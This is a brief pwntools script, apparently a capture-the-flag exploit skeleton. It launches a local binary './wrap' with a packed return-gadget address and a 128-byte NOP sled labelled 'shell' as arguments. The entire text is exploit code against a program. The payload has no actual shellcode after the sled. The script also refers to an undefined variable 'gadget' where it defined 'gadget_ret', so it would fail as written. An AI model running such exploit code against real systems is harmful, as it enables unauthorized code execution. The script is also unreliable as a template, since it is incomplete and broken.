from pwn import *

gadget_ret = 0x55557a1a

shell = '\x90' * 128

p = process(['./wrap', p32(gadget), shell])





